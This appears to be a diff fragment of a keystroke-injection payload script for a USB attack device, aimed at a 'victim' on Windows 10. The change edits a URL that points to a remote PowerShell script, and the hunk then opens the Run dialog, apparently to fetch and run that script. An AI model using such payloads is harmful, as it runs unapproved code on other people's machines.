@@ -6,7 +6,7 @@ REM     Description: This payload is meant to prank your victim with TURNING on 
 
 REM     Target: Windows 10
 
-"URL='http://example.com/powershell.ps1'"
+"URL='http://example.com/powershell.ps1?dl=1'"
 
 QUACK DELAY 2000
 QUACK GUI r
